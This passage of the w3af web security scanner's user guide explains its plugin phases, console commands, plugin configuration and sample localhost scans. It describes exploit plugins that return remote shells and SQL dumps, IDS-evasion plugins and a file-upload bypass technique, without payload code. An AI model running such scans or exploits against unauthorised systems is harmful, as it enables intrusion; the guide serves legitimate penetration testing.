style="margin-left:1.25cm;"><p class="P102" style="margin-left:0.25cm;"> </p></li></ul><p class="P4">As you may have guessed, the core requirements are needed to run w3af with any user interface (console or graphical), and the graphical user interface requirements are needed only if you plan to use the GTK+ user interface. </p><p class="P4">Some of the requirements are bundled with the distribution file, in order to make the installation process easier for the novice user. The bundled requirements can be found inside the <span class="T5">extlib</span> directory. Most of the libraries can be run from<span class="T6"> that</span> directory, but some others require an installation process, the installation steps for these libraries are (as root):</p><p class="P19"> </p><p class="P52">cd w3af </p><p class="P62">cd extlib </p><p class="P52">cd fpconst-0.7.2 </p><p class="P52">python setup.py install </p><p class="P52">cd .. </p><p class="P52">cd pygoogle </p><p class="P52">python setup.py install </p><p class="P52">cd .. </p><p class="P52">cd SOAPpy </p><p class="P52">python setup.py install </p><p class="P52">cd pyPdf </p><p class="P52">python setup.py install </p><p class="P19"> </p><h2 class="P42"><a name="w3af_phases" />w3af phases</h2><p class="P19"> </p><p class="P4">Before running w3af a user must know how the application is divided and how plugins are going to be executed. Basically, w3af has three types of plugins: discovery , audit and attack.</p><p class="P4"><span class="T5">Discovery plugins</span> have only one responsibility, finding new URLs, forms, and other “injection points”. A classic example of a discovery plugin is a web spider. This plugin takes a URL as input and returns one or more injection points. When a user enables more than one plugin of this type, they work in a loop: If plugin A finds a new URL in the first run, the w3af core will send that URL to plugin B. If plugin B then finds a new URL, it will be sent to plugin A. This process will go on until all plugins are run and no more knowledge about the application can be found using the enabled discovery plugins.</p><p class="P4"><span class="T5">Audit plugins</span> take the injection points found by discovery plugins and send specially crafted data to all of them in order to find vulnerabilities. A classic example of an audit plugin is one that searches for SQL injection vulnerabilities.</p><p class="P32">Attack plugins <span class="T6">objective is to exploit vulnerabilities found by audit plugins. They usually return a shell on the remote server, or a dump of remote tables in the case of SQL injections exploits.</span></p><p class="P21"> </p><h2 class="P43"><a name="Running_w3af" />Running w3af</h2><p class="P21"> </p><p class="P5">w3af has two user interfaces, the console user interface (consoleUI) and the graphical user interface (gtkUi). This user guide will focus on the consoleUI, which ismore fully tested and complete than the gtkUi. To fire up the consoleUI you just have to execute w3af without parameters and you will get a prompt like this one:</p><p class="P53"><span class="T1">$</span> ./w3af_console</p><p class="P54">w3af&gt;&gt;&gt; </p><p class="P53"> </p><p class="P6">From this prompt you will be able to configure the framework, launch scans and ultimately exploit a vulnerability. At this  prompt you can start typing commands. The first command you have to learn is “help” (please note that commands are case sensitive):</p><p class="P24"> </p><p class="P53"><span class="T1">w3af&gt;&gt;&gt;</span> help</p><p class="P53">|------------------------------------------------------|  </p><p class="P53">| start         | Start the scan.                      | </p><p class="P53">| plugins       | Enable and configure plugins.        | </p><p class="P53">| exploit       | Exploit the vulnerability.           | </p><p class="P53">| profiles      | List and use scan profiles.          | </p><p class="P53">|------------------------------------------------------|  </p><p class="P53">| http-settings | Configure the http settings of the   |</p><p class="P53">|               | framework.                           | </p><p class="P53">| misc-settings | Configure w3af misc settings.        | </p><p class="P53">| target        | Configure the target URL.            | </p><p class="P53">|------------------------------------------------------|  </p><p class="P53">| back          | Go to the previous menu.             | </p><p class="P53">| exit          | Exit w3af.                           | </p><p class="P53">| assert        | Check assertion.                     | </p><p class="P53">|------------------------------------------------------|  </p><p class="P53">| help          | Display help. issuing: help [command]|</p><p class="P53">|               | , prints more specific help about    |</p><p class="P53">|               | "command"                            | </p><p class="P53">| version       | Show w3af version information.       | </p><p class="P53">| keys          | Display key shortcuts.               | </p><p class="P53">|------------------------------------------------------|  </p><p class="P54">w3af&gt;&gt;&gt; </p><p class="P53"><span class="T1">w3af&gt;&gt;&gt;</span> help target</p><p class="P53">Configure the target URL. </p><p class="P54">w3af&gt;&gt;&gt; </p><p class="P54"> </p><p class="P6">The main menu commands are explained in the help that is displayed above. The internals of every menu will be seen later in this document. As you already noticed, the “help” command can take a parameter, and if available, a detailed help for that parameter will be shown, <span class="T11">e.g. “help keys”.</span></p><p class="P6">Other interesting things to notice about the consoleUI is  the ability for tabbed completion (type 'plu' and then TAB) and the command history (after typing some commands, navigate the history with the up and down arrows).</p><p class="P6">To enter a configuration menu, you just have to type its name and hit enter, you will see how the prompt changes and you are now in that context:</p><p class="P54">w3af&gt;&gt;&gt;<span class="T13">http-settings </span></p><p class="P54">w3af/config:http-settings&gt;&gt;&gt; </p><p class="P24"> </p><p class="P24">All the configuration menus provide the following commands: </p><ul style="margin-left:1.25cm;"><li class="P80" style="margin-left:0cm;"><p class="P80" style="margin-left:0.25cm;">help </p></li><li class="P80" style="margin-left:0cm;"><p class="P80" style="margin-left:0.25cm;">view </p></li><li class="P80" style="margin-left:0cm;"><p class="P80" style="margin-left:0.25cm;">set </p></li><li class="P80" style="margin-left:0cm;"><p class="P80" style="margin-left:0.25cm;">back </p></li></ul><p class="P24"> </p><p class="P24">Here is a usage example of this commands in the http-settings menu: </p><p class="P24"> </p><p class="P53"><span class="T1">w3af/config:http-settings&gt;&gt;&gt;</span> help</p><p class="P53">|-------------------------------------------------------------| </p><p class="P53">| view   | List the available options and their values.       | </p><p class="P53">| set    | Set a parameter value.                             | </p><p class="P53">|-------------------------------------------------------------|  </p><p class="P53">| back   | Go to the previous menu.                           | </p><p class="P53">| exit   | Exit w3af.                                         | </p><p class="P53">| assert | Check assertion.                                   | </p><p class="P53">|-------------------------------------------------------------|  </p><p class="P53"><span class="T1">w3af/config:http-settings&gt;&gt;&gt;</span> view</p><p class="P55">|-------------------------------------------------------------|  </p><p class="P55">| Setting                  | Value              | Description | --------------------------------------------------------------| </p><p class="P55">| timeout                  | 10                 | The         | </p><p class="P55">|                          |                    | timeout     | </p><p class="P55">|                          |                    | for         | </p><p class="P55">|                          |                    | connections |                          |                          |                    | to the      | </p><p class="P55">|                          |                    | HTTP        | </p><p class="P55">|                          |                    | server      | </p><p class="P55">| headersFile              |                    | Set the     | </p><p class="P55">|                          |                    | headers     | </p><p class="P55">|                          |                    | filename.   | </p><p class="P55">|                          |                    | This        | </p><p class="P55">|                          |                    | file        | </p><p class="P55">|                          |                    | has         | </p><p class="P55">|                          |                    | additional  | </p><p class="P55">|                          |                    | headers     | </p><p class="P55">|                          |                    | that        | </p><p class="P55">|                          |                    | are         | </p><p class="P55">|                          |                    | added       | </p><p class="P55">|                          |                    | to each     | </p><p class="P55">|                          |                    | request.    | </p><p class="P55">|-------------------------------------------------------------|  </p><p class="P55">| ignoreSessCookies        | False              | Ignore      | </p><p class="P55">|                          |                    | session     | </p><p class="P55">|                          |                    | cookies     | </p><p class="P55">| cookieJarFile            |                    | Set the     | </p><p class="P55">|                          |                    | cookiejar   | </p><p class="P55">|                          |                    | filename.   | </p><p class="P55">|-------------------------------------------------------------|  </p><p class="P55">... </p><p class="P53"><span class="T1">w3af/config:http-settings&gt;&gt;&gt;</span> set timeout 5</p><p class="P53"><span class="T1">w3af/config:http-settings&gt;&gt;&gt;</span> view</p><p class="P53">... </p><p class="P55">| timeout                  | 5                  | The         | </p><p class="P53">... </p><p class="P53"> </p><p class="P6">To summarize, the “view” command is used to list all configurable parameters, with their values and a description. The set command is used to change a value. Finally we can execute “back”, “.” or press CTRL+C to return to the previous menu. A detailed help for every configuration parameter can be obtained using “help parameter” as  shown in this example:</p><p class="P36"> </p><p class="P53"><span class="T1">w3af/config:http-settings&gt;&gt;&gt;</span> help timeout</p><p class="P53">Help for parameter timeout: </p><p class="P53">=========================== </p><p class="P53">Set low timeouts for LAN use and high timeouts for slow Internet connections. </p><p class="P54">w3af/config:http-settings&gt;&gt;&gt; </p><p class="P28"> </p><p class="P7">The “http-settings” and the “misc-settings” configuration menus are used to set system wide parameters that are used by the framework. All the parameters have defaults and in most cases you can leave them as they are. w3af was designed in a way that allows beginners to run it without having to learn a lot of its internals. It is also flexible enough to be tuned by experts that know what they want and need to change internal configuration parameters to fulfill their tasks.</p><p class="P26"> </p><p class="P21"> </p><p class="P21" /><h3 class="P8"><a name="Running_w3af_with_GTK_user_interface" />Running w3af with GTK user interface</h3><p class="P21"> </p><p class="P21">The framework also has a graphical user interface that you can start by executing: </p><p class="P21"> </p><p class="P53"><span class="T1">$ </span>./w3af_gui</p><p class="P53"> </p><p class="P7">The graphical user interface allows you to perform all the actions that the framework offers and features a much easier and faster way to start a scan and analyze the results. </p><p class="P7">In case you are wondering  what the graphical user interface looks like, here is a screenshot:</p><ul style="margin-left:0.5cm;"><li class="P83" style="margin-left:0cm;"><p class="P83" style="margin-left:0.25cm;"><img width="733" height="492" alt="" src="file:///home/dz0/w3af/w3af/trunk/readme/EN/" class="fr1" /></p></li></ul><h3 class="P8"><a name="Plugins" />Plugins</h3><p class="Textbody" /><p class="P9">Plugins do all the magic. The plugins will find the URLs, discover the vulnerabilities and exploit them. So now, we will learn how to configure the plugins. In a previous section it was explained that w3af had three core types of plugins: discovery, audit and exploit.  The complete list of plugins types is:</p><p class="Textbody"> </p><ul style="margin-left:1.25cm;"><li class="P96" style="margin-left:0cm;"><p class="P96" style="margin-left:0.25cm;">discovery </p></li><li class="P96" style="margin-left:0cm;"><p class="P96" style="margin-left:0.25cm;">audit </p></li><li class="P96" style="margin-left:0cm;"><p class="P96" style="margin-left:0.25cm;">grep </p></li><li class="P96" style="margin-left:0cm;"><p class="P96" style="margin-left:0.25cm;">exploit </p></li><li class="P96" style="margin-left:0cm;"><p class="P96" style="margin-left:0.25cm;">output </p></li><li class="P96" style="margin-left:0cm;"><p class="P96" style="margin-left:0.25cm;">mangle </p></li><li class="P96" style="margin-left:0cm;"><p class="P96" style="margin-left:0.25cm;">bruteforce </p></li><li class="P96" style="margin-left:0cm;"><p class="P96" style="margin-left:0.25cm;">evasion </p></li></ul><p class="Textbody"> </p><p class="P9">Discovery plugins find new points of injection that are later used by audit plugins to find vulnerabilities. Grep plugins analyze all page content and find vulnerabilities on pages that are requested by other plugins; for example, a grep plugin will find a comment on the HTML body that has the word “password” inside it  and generate a vulnerability based on it.</p><p class="P9">Exploit plugins [ab]use the vulnerabilities found in the audit phase and return something useful to the user ( remote shell, SQL table dump, a proxy, etc ). </p><p class="P9">Output plugins are the way the framework and the plugins communicate with the user. Output plugins save the data to a text or html file. Debugging information is also sent to the output plugins and can be saved for analysis.</p><p class="P9">Mangle plugins allow modification of requests and responses based on regular expressions, think “sed (stream editor) for the web”.</p><p class="P9">Bruteforce plugins will bruteforce logins. These plugins are  part of the discovery phase. </p><p class="P9">Finally, evasion plugins try to evade simple intrusion detection rules. </p><h3 class="P8"><a name="Plugin_configuration" />Plugin configuration</h3><p class="P9">The plugins are configured using the “plugins” configuration menu. </p><p class="Textbody"> </p><p class="P52"><span class="T1">w3af&gt;&gt;&gt;</span> plugins</p><p class="P52"><span class="T1">w3af/plugins&gt;&gt;&gt;</span> help</p><p class="P52">|-------------------------------------------------------------|  </p><p class="P52">| list       | List available plugins.                        | </p><p class="P52">|-------------------------------------------------------------|  </p><p class="P52">| back       | Go to the previous menu.                       | </p><p class="P52">| exit       | Exit w3af.                                     | </p><p class="P52">| assert     | Check assertion.                               | </p><p class="P52">|-------------------------------------------------------------|  </p><p class="P52">| mangle     | View, configure and enable mangle plugins      | </p><p class="P52">| evasion    | View, configure and enable evasion plugins     | </p><p class="P52">| discovery  | View, configure and enable discovery plugins   | </p><p class="P52">| grep       | View, configure and enable grep plugins        | </p><p class="P52">| bruteforce | View, configure and enable bruteforce plugins  | </p><p class="P52">| audit      | View, configure and enable audit plugins       | </p><p class="P52">| output     | View, configure and enable output plugins      | </p><p class="P52">|-------------------------------------------------------------|  </p><p class="P56">w3af/plugins&gt;&gt;&gt; </p><p class="P34"> </p><p class="P10">All plugins can be configured here except the exploit plugins.,   The example below demonstrates how to find the syntax for a plugin:</p><p class="P29"> </p><p class="P11"><span class="T1">w3af/plugins&gt;&gt;&gt;</span> help audit</p><p class="P11">View, configure and enable audit plugins  </p><p class="P11">Syntax: audit [config plugin | plugin1[,plugin2 ... pluginN] | desc plugin]  </p><p class="P11">Example: audit  </p><p class="P11">Result: All enabled audit plugins are listed.  </p><p class="P11"> </p><p class="P11">Example2: audit LDAPi,blindSqli  </p><p class="P11">Result: LDAPi and blindSqli are configured to run  </p><p class="P11"> </p><p class="P11">Example3: audit config LDAPi </p><p class="P11">Result: Enters to the plugin configuration menu.  </p><p class="P11"> </p><p class="P11">Example4: audit all,!blindSqli  </p><p class="P11">Result: All audit plugins are configured to run except blindSqli.  </p><p class="P11"> </p><p class="P11">Example5: audit desc LDAPi&#13;</p><p class="P11">Result: You will get the plugin description.&#13; </p><p class="P11">&#13; </p><p class="P11">Example6: audit LDAPi,blindSqli&#13; </p><p class="P11">          audit !LDAPi&#13;</p><p class="P11">Result: LDAPi is disabled in the second command, only blindSqli will run.&#13;</p><p class="P11"><span class="T1">w3af/plugins&gt;&gt;&gt;</span> help list</p><p class="P11">List available plugins.  </p><p class="P11">Syntax: list {plugin type} [all | enabled | disabled]  </p><p class="P11">By default all plugins are listed.  </p><p class="P11"> </p><p class="P56">w3af/plugins&gt;&gt;&gt; </p><p class="P56"> </p><p class="P10">The example below demonstrates the use of the list command to see all available plugins and their status.</p><p class="P60"><span class="T1">w3af/plugins&gt;&gt;&gt;</span> list audit</p><p class="P60">|------------------------------------------------------------|  </p><p class="P60">| Plugin name       | Status  | Conf | Description           | </p><p class="P60">|------------------------------------------------------------|  </p><p class="P60">| LDAPi             |         |      | Find LDAP injection   | </p><p class="P60">|                   |         |      | bugs.                 | </p><p class="P60">| blindSqli         |         | Yes  | Find blind SQL        | </p><p class="P60">|                   |         |      | injection             | </p><p class="P60">|                   |         |      | vulnerabilities.      | </p><p class="P60">| buffOverflow      |         |      | Find buffer overflow  | </p><p class="P60">|                   |         |      | vulnerabilities.      | </p><p class="P60">| dav               |         |      | Tries to upload a     | </p><p class="P60">|                   |         |      | file using HTTP PUT   | </p><p class="P60">|                   |         |      | method.               | </p><p class="P60">| eval              |         |      | Finds incorrect usage | </p><p class="P60">|                   |         |      | of the eval().        | </p><p class="P60">... </p><p class="P60"> </p><p class="P10">To enable the xss and sqli plugins, and then verify that the command was understood by the framework, we issue this set of commands: </p><p class="P29"> </p><p class="P11"><span class="T1">w3af/plugins&gt;&gt;&gt;</span> audit xss, sqli</p><p class="P11"><span class="T1">w3af/plugins&gt;&gt;&gt;</span> audit</p><p class="P11">|------------------------------------------------------------|  </p><p class="P11">| Plugin name       | Status  | Conf | Description           | </p><p class="P11">|------------------------------------------------------------|  </p><p class="P11">... </p><p class="P11">| sqli              | Enabled |      | Find SQL injection    | </p><p class="P11">|                   |         |      | bugs.                 | </p><p class="P11">... </p><p class="P11">| xss               | Enabled | Yes  | Find cross site       | </p><p class="P11">|                   |         |      | scripting             | </p><p class="P11">|                   |         |      | vulnerabilities.      | </p><p class="P11">| xst               |         |      | Verify Cross Site     | </p><p class="P11">|                   |         |      | Tracing               | </p><p class="P11">|                   |         |      | vulnerabilities.      | </p><p class="P11">|------------------------------------------------------------|  </p><p class="P56">w3af/plugins&gt;&gt;&gt; </p><p class="P29"> </p><p class="P4">Or if the user is interested in knowing exactly what a plugin does, he can also run the “<span class="T8">desc” </span>command like this:</p><p class="P29"> </p><p class="P11"><span class="T1">w3af&gt;&gt;&gt;</span> plugins</p><p class="P11"><span class="T1">w3af/plugins&gt;&gt;&gt;</span> audit desc fileUpload</p><p class="P11"> </p><p class="P11">This plugin will try to expoit insecure file upload forms. </p><p class="P11"> </p><p class="P69">               One configurable parameter exists:</p><p class="P69">                        - extensions</p><p class="P11"> </p><p class="P11">The extensions parameter is a comma separated list of extensions that this plugin will try to upload. Many web applications              verify the extension of the file being uploaded, if special extensions are required, they can be added here.</p><p class="P35"> </p><p class="P11">Some web applications check the contents of the files being uploaded to see if they are really what their extension                is telling. To bypass this check, this plugin uses file templates located at "plugins/audit/fileUpload/", this templates</p><p class="P11">are valid files for each extension that have a section ( the comment field in a gif file for example ) that can be replaced </p><p class="P35">     by scripting code ( PHP, ASP, etc ).</p><p class="P35"> </p><p class="P11">After uploading the file, this plugin will try to find it on common directories like "upload" and "files" on every know directory. If the file is found, a vulnerability exists. </p><p class="P11"> </p><p class="P56">w3af/plugins&gt;&gt;&gt; </p><p class="P29"> </p><p class="P10">Now we know what this plugin does, but let's check their internals: </p><p class="P29"> </p><p class="P11"><span class="T1">w3af/plugins&gt;&gt;&gt;</span> audit config xss</p><p class="P11"><span class="T1">w3af/plugins/audit/config:xss&gt;&gt;&gt; </span>view</p><p class="P61">|------------------------------------------------------------|  </p><p class="P61">| Setting         | Value | Description                      | </p><p class="P61">|------------------------------------------------------------|  </p><p class="P61">| numberOfChecks  | 3     | Set the amount of checks to      | </p><p class="P61">|                 |       | perform for each fuzzable        | </p><p class="P61">|                 |       | parameter. Valid numbers: 1 to   | </p><p class="P61">|                 |       | 13                               | </p><p class="P61">| checkStored     | True  | Search persistent XSS            | </p><p class="P61">|------------------------------------------------------------|  </p><p class="P61"> </p><p class="P61"><span class="T1">w3af/plugin/xss&gt;&gt;&gt;</span><span class="T1"> </span>set checkStored False</p><p class="P11"><span class="T1">w3af/plugin/xss&gt;&gt;&gt;</span> back</p><p class="P11"><span class="T1">w3af/plugins&gt;&gt;&gt;</span> audit config sqli</p><p class="P11"><span class="T1">w3af/plugins/audit/config:sqli&gt;&gt;&gt; </span>view </p><p class="P11">|------------------------------------------------------------|  </p><p class="P11">| Setting          | Value       | Description               | </p><p class="P11">|------------------------------------------------------------|  </p><p class="P11">|------------------------------------------------------------|  </p><p class="P56">w3af/plugins/audit/config:sqli&gt;&gt;&gt;  </p><p class="P58">w3af/plugins/audit/config:sqli&gt;&gt;&gt; <span class="T13">back</span></p><p class="P56">w3af/plugins&gt;&gt;&gt; </p><p class="P29"> </p><p class="P10">The configuration menus for the plugins also have the set command for changing the parameters values, and the view command for listing existing values. On the previous example we disabled persistent cross site scripting checks in the xss plugin, and listed the options of the sqli plugin (it actually has no configurable parameters). </p><p class="P29"> </p><h2 class="Heading2"><a name="Starting_a_scan" />Starting a scan</h2><p class="P29"> </p><p class="P10">After configuring all desired plugins the user has to set the target URL and finally start the scan. The target selection is done this way: </p><p class="P29"> </p><p class="P11"><span class="T1">w3af&gt;&gt;&gt;</span> target</p><p class="P11"><span class="T1">w3af/config:target&gt;&gt;&gt; </span>set target http://localhost/</p><p class="P11"><span class="T1">w3af/config:target&gt;&gt;&gt;</span> back</p><p class="P56">w3af&gt;&gt;&gt; </p><p class="P34"> </p><p class="P29">Finally, you execute “start” in order to run all the configured plugins. </p><p class="P29"> </p><p class="P11"><span class="T1">w3af&gt;&gt;&gt;</span> start</p><p class="P29"> </p><p class="P29">At any time during the scan, you may hit “enter” in order to get a live status of the w3af core. Status lines look like this: </p><p class="P11">Status: Running discovery.webSpider on http://localhost/w3af/ | Method: GET. </p><p class="P35"> </p><p class="P11"> </p><h3 class="Heading3"><a name="A_complete_session" />A complete session</h3><p class="P29"> </p><p class="P10">An example of an entire w3af session appears below.  Attention should be paid to the inline comments as they provide additional details.</p><p class="P29"> </p><p class="P11"><span class="T1">$</span> ./w3af</p><p class="P11"><span class="T1">w3af&gt;&gt;&gt;</span> plugins</p><p class="P11"><span class="T1">w3af/plugins&gt;&gt;&gt;</span> output console,textFile</p><p class="P11"><span class="T1">w3af/plugins&gt;&gt;&gt;</span> output config textFile</p><p class="P11"><span class="T1">w3af/plugins/output/config:textFile&gt;&gt;&gt;</span> set fileName output-w3af.txt</p><p class="P11"><span class="T1">w3af/plugins/output/config:textFile&gt;&gt;&gt;</span> set verbose True</p><p class="P11"><span class="T1">w3af/plugins/output/config:textFile&gt;&gt;&gt;</span> back</p><p class="P11"><span class="T1">w3af/plugins&gt;&gt;&gt;</span> output config console</p><p class="P11"><span class="T1">w3af/plugins/output/config:console&gt;&gt;&gt;</span> set verbose False</p><p class="P11"><span class="T1">w3af/plugins/output/config:console&gt;&gt;&gt;</span> back</p><p class="P29"> </p><p class="P10">All this previous commands have enabled two output plugins, console and textFile and configured them as needed. </p><p class="P29"> </p><p class="P11"><span class="T1">w3af/plugins&gt;&gt;&gt;</span> discovery allowedMethods,webSpider</p><p class="P11"><span class="T1">w3af/plugins&gt;&gt;&gt;</span> back</p><p class="P11"> </p><p class="P10">In this case, we will be running only discovery plugins. The enabled plugins are allowedMethods and webSpider . </p><p class="P11"> </p><p class="P11"><span class="T1">w3af&gt;&gt;&gt;</span> target</p><p class="P11"><span class="T1">w3af/target&gt;&gt;&gt;</span>set target http://localhost/w3af/</p><p class="P11"><span class="T1">w3af/target&gt;&gt;&gt;</span>back</p><p class="P11"><span class="T1">w3af&gt;&gt;&gt;</span> start</p><p class="P11">New URL found by discovery: http://localhost/w3af/responseSplitting/responseSplitting.php </p><p class="P11">New URL found by discovery: http://localhost/w3af/blindSqli/blindSqli-str.php </p><p class="P11">New URL found by discovery: http://localhost/w3af/webSpider/2.html </p><p class="P11">...</p><p class="P11">... </p><p class="P11">The URL: http://localhost/beef/hook/ has DAV methods enabled: </p><p class="P11">- OPTIONS </p><p class="P11">- GET </p><p class="P11">- HEAD </p><p class="P11">- POST </p><p class="P11">- TRACE </p><p class="P11">- PROPFIND </p><p class="P11">- PROPPATCH </p><p class="P11">- COPY </p><p class="P11">- MOVE </p><p class="P11">- LOCK </p><p class="P11">- UNLOCK </p><p class="P11">- DELETE ( is possibly enabled too, not tested for safety ) </p><p class="P11">New URL found by discovery: http://localhost/w3af/globalRedirect/wargame/ </p><p class="P11">New URL found by discovery: http://localhost/w3af/globalRedirect/w3af-site.tgz </p><p class="P11"> </p><p class="P10">After the discovery phase is finished a summary is presented to the user: </p><p class="P11"> </p><p class="P11">The list of found URLs is: </p><p class="P11">- http://localhost/w3af/globalRedirect/w3af.testsite.tgz </p><p class="P11">- http://localhost/beef/hook/beefmagic.js.php </p><p class="P11">- http://localhost/w3af/globalRedirect/2.php </p><ul style="margin-left:0.5cm;"><li class="P104" style="margin-left:1.25cm;"><p class="P104" style="margin-left:0.25cm;">http://localhost/w3af/webSpider/11.html </p><p class="P104" style="margin-left:0.25cm;">... </p></li></ul><p class="P35"> </p><p class="P10">A section of the summary is the points of injection that will be used in the audit phase: </p><p class="P35"> </p><p class="P11">Found 78 URLs and 102 different points of injection. </p><p class="P11">The list of Fuzzable requests is: </p><p class="P11">- http://localhost/w3af/ | Method: GET </p><p class="P11">- http://localhost/w3af/responseSplitting/responseSplitting.php | Method: GET | Parameters: (header)</p><ul style="margin-left:0.5cm;"><li class="P105" style="margin-left:1.25cm;"><p class="P105" style="margin-left:0.25cm;">http://localhost/w3af/sqli/dataReceptor.php | Method: POST | Parameters: (user,firstname) </p></li></ul><p class="P10">Finally the user exits the application, returning to the shell. </p><p class="P11"><span class="T1">w3af&gt;&gt;&gt;</span> exit</p><p class="P11">w3af, better than the regular script kiddie. </p><p class="P56">$ </p><p class="P35"> </p><h2 class="Heading2"><a name="A_warning_about_discovery" />A warning about discovery</h2><p class="Textbody"> </p><p class="Textbody">The discovery phase is a double edged sword: use it with wisdom, and it will give you a lot of knowledge about the remote web application, use it in a greedy way and you will be waiting for hours until the discovery phase ends. Just to make things clear, the greedy way is to enable all discovery plugins ( “discovery all” ) without even knowing what you are doing or having manually browsed the web and understood its internals.  </p><p class="Textbody">Some examples will make things clear:  </p><ul style="margin-left:1.25cm;"><li class="P99" style="margin-left:0cm;"><p class="P99" style="margin-left:0.25cm;">“You are testing an intranet web application, the web application is huge and doesn't use any macromedia flash or javascript code”.  </p><p class="P99" style="margin-left:0.25cm;"><span class="T5">Recommendation :</span> “discovery all,!spiderMan, !fingerGoogle, !fingerMSN, !fingerPKS, !MSNSpider, !googleSpider, !phishtank, !googleSafeBrowsing”.</p><p class="P100" style="margin-left:0.25cm;">Reason: <span class="T6">Spiderman should only be used when webSpider can't find all links. The fingerGoogle, fingerMSN and fingerPKS plugins discover mail addresses from search engines, if this is an intranet application, the addresses put in this site wont be available in search engines because they never were indexed. MSNSpider and googleSpider find URLs using search engines, like the ones before, they are useless because search engines don't index private pages. phishtank and googleSafeBrowsing should be enabled because they search for phishing sites, and like the ones before them, private sites aren't indexed in this systems.</span></p><p class="P97" style="margin-left:0.25cm;"> </p></li><li class="P97" style="margin-left:0cm;"><p class="P97" style="margin-left:0.25cm;">“You are testing a web application over the internet, the web application is huge and doesn't use any macromedia flash or javascript code”.  </p><p class="P97" style="margin-left:0.25cm;"><span class="T5">Recommendation</span> : “discovery all,!spiderMan, !wordnet , !googleSets”.</p><p class="P100" style="margin-left:0.25cm;">Reason: <span class="T6">Spiderman should only be used when webSpider can't find all links. The wordnet and googleSets plugins are two plugins that take a long time to run over the internet so it's a good idea to disable them.</span></p><p class="P97" style="margin-left:0.25cm;"> </p></li><li class="P97" style="margin-left:0cm;"><p class="P97" style="margin-left:0.25cm;">“You are testing a web application over the internet, the web application is huge and has macromedia flash or javascript code. You also know that the application doesn't implement any web services”. </p><p class="P97" style="margin-left:0.25cm;"><span class="T5">Recommendation</span> : “discovery all, !wordnet , !googleSets, !wsdlFinder”.</p><p class="P100" style="margin-left:0.25cm;">Reason: <span class="T6">The wordnet and googleSets plugins are two plugins that take a </span><span class="T6">long time to run over the internet so it's a good idea to disable them. Regarding wsdlFinder, if we already know that no web services exist, why look for them?</span></p><p class="P97" style="margin-left:0.25cm;"> </p></li><li class="P97" style="margin-left:0cm;"><p class="P97" style="margin-left:0.25cm;">“You are testing a web application over the internet, the web application is huge, you really need to know all the links and functionality of the site and you don't care waiting.”.  </p><p class="P97" style="margin-left:0.25cm;"><span class="T5">Recommendation</span> : “discovery all” .</p><p class="P100" style="margin-left:0.25cm;">Reason: <span class="T6">You really need to get a lot of knowledge about the site and don't care if it takes a complete day.</span></p></li></ul><h3 class="Heading3"><a name="When_everything_else_fails..." />When everything else fails...</h3><p class="P45">So, you enabled only the recommended plugins in the discovery phase, you started the framework one hour ago, the discovery is still running and doesn't find anything. When you find yourself in this situation you have two options, waiting for w3af to finish or hitting CTRL+C to finish the discovery and start with the audit phase. </p><p class="P45">You should also remember that if you are saving the debug information to a text file you can open a new terminal and run a “tail -f w3af-output-file.txt” to see what w3af is really doing. </p><h2 class="Heading2"><a name="w3af_scripts" />w3af scripts</h2><p class="Textbody"> </p><p class="P9">While developing w3af, I realized that I needed a fast way to execute the same steps over and over, so the script functionality was born. w3af can run a script file using the “-s” argument. Script files are text files with one command on each line. An example script file would look like this: </p><p class="Textbody"> </p><p class="P52"><span class="T1">$</span> head scripts/script-osCommanding.w3af</p><p class="P52"># This is the osCommanding demo: </p><p class="P52"> </p><p class="P52">plugins </p><p class="P52">output console,textFile </p><p class="P52">output </p><p class="P52">output config textFile </p><p class="P52">set fileName output-w3af.txt</p><p class="P52">set verbose True </p><p class="P52">back </p><p class="P52"> </p><p class="P31">To run this script you would execute <span class="T7">“./w3af_console -s scripts/script-osCommanding.w3af” </span>,  the output would look just like if you typed every command by hand in the console:</p><p class="P23"> </p><p class="P52"><span class="T1">$</span> ./w3af_console -s scripts/script-osCommanding.w3af</p><p class="P56">w3af&gt;&gt;&gt;<span class="T13">plugins </span></p><p class="P56">w3af/plugins&gt;&gt;&gt;<span class="T13">output console,textFile </span></p><p class="P56">w3af/plugins&gt;&gt;&gt;<span class="T13">output</span> </p><p class="P11">|-----------------------------------------------------------|  </p><p class="P11">| Plugin    | Status  | Conf | Description                  | </p><p class="P11">| name      |         |      |                              | </p><p class="P11">|-----------------------------------------------------------|  </p><p class="P11">| console   | Enabled | Yes  | Print messages to the        | </p><p class="P11">|           |         |      | console.                     | </p><p class="P11">| gtkOutput |         |      | Saves messages to            | </p><p class="P11">|           |         |      | kb.kb.getData('gtkOutput',   | </p><p class="P11">|           |         |      | 'queue'), messages are saved | </p><p class="P11">|           |         |      | in the form of objects.      | </p><p class="P11">| htmlFile  |         | Yes  | Print all messages to a HTML | </p><p class="P11">|           |         |      | file.                        | </p><p class="P11">| textFile  | Enabled | Yes  | Prints all messages to a     | </p><p class="P11">|           |         |      | text file.                   | </p><p class="P11">| webOutput |         |      | Print all messages to the    | </p><p class="P11">|           |         |      | web user interface - this    | </p><p class="P11">|           |         |      | plugin and the web user      | </p><p class="P11">|           |         |      | interface are DEPRECATED.    | </p><p class="P11">|-----------------------------------------------------------|  </p><p class="P56">w3af/plugins&gt;&gt;&gt;<span class="T13">output config textFile </span></p><p class="P56">w3af/plugins/output/config:textFile&gt;&gt;&gt;<span class="T13">set fileName output-w3af.txt </span></p><p class="P56">w3af/plugins/output/config:textFile&gt;&gt;&gt;<span class="T13">set verbose True </span></p><p class="P56">w3af/plugins/output/config:textFile&gt;&gt;&gt;<span class="T13">back </span></p><p class="P56">w3af/plugins&gt;&gt;&gt;<span class="T13">output config console </span></p><p class="P56">w3af/plugins/output/config:console&gt;&gt;&gt;<span class="T13">set verbose False </span></p><p class="P56">w3af/plugins/output/config:console&gt;&gt;&gt;<span class="T13">back </span></p><p class="P56">w3af/plugins&gt;&gt;&gt;<span class="T13">back </span></p><p class="P56">w3af&gt;&gt;&gt;<span class="T13">plugins </span></p><p class="P56">w3af/plugins&gt;&gt;&gt;<span class="T13">audit osCommanding </span></p><p class="P56">w3af/plugins&gt;&gt;&gt;<span class="T13">back </span></p><p class="P56">w3af&gt;&gt;&gt;<span class="T13">target </span></p><p class="P56">w3af/config:target&gt;&gt;&gt;<span class="T13">set target http://localhost/w3af/osCommanding/vulnerable.php?command=f0as9 </span></p><p class="P56">w3af/config:target&gt;&gt;&gt;<span class="T13">back </span></p><p class="P56">w3af&gt;&gt;&gt;<span class="T13">start </span></p><p class="P11">Found 1 URLs and 1 different points of injection.  </p><p class="P11">The list of URLs is:  </p><p class="P11">- http://localhost/w3af/osCommanding/vulnerable.php  </p><p class="P11">The list of fuzzable requests is:  </p><p class="P11">- 